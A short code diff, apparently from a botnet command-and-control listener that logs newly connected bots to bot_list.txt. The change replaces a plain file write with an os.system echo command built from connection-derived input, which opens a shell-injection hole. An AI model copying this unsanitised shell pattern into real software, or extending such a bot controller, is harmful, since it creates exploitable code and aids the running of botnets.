@@ -49,9 +49,8 @@ while True:
     print(Fore.CYAN + " [+] " + Fore.MAGENTA + "Old bot")
     print("")
   else:
-    f = open("bot_list.txt", 'w')
-    f.write(con[0] + '\n')
-    f.close()
+    com = 'echo "'+con[0]+'">>bot_list.txt'
+    os.system(com)
     print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
     print("")
     data = conn.recv(10240)
